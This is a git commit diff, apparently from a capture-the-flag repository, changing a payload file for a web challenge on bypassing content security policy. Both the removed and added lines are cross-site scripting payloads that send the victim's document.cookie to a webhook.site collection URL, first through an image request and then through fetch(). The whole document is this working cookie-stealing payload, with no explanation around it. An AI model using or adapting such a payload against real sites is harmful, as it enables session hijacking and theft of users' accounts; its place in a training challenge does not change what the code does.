c3a78538b61cb753e6a07b5397d46ae51ab17289
AlcoholicDad <jamalscottkroll@gmail.com>
2024-06-23 00:08:52 +0000

    changed script

--- challenges/veryeasy/web/csp_bypass/cursed_secret_party/cursed_secret_party.js
+++ challenges/veryeasy/web/csp_bypass/cursed_secret_party/cursed_secret_party.js
@@ -1,2 +1,1 @@
-x = new Image(); 
-x.src = 'https://webhook.site/7c7af87c-32bf-4e4d-9a93-7c4c08a03c76?data='+btoa(document.cookie);
+fetch('https://webhook.site/7c7af87c-32bf-4e4d-9a93-7c4c08a03c76?data='+document.cookie);
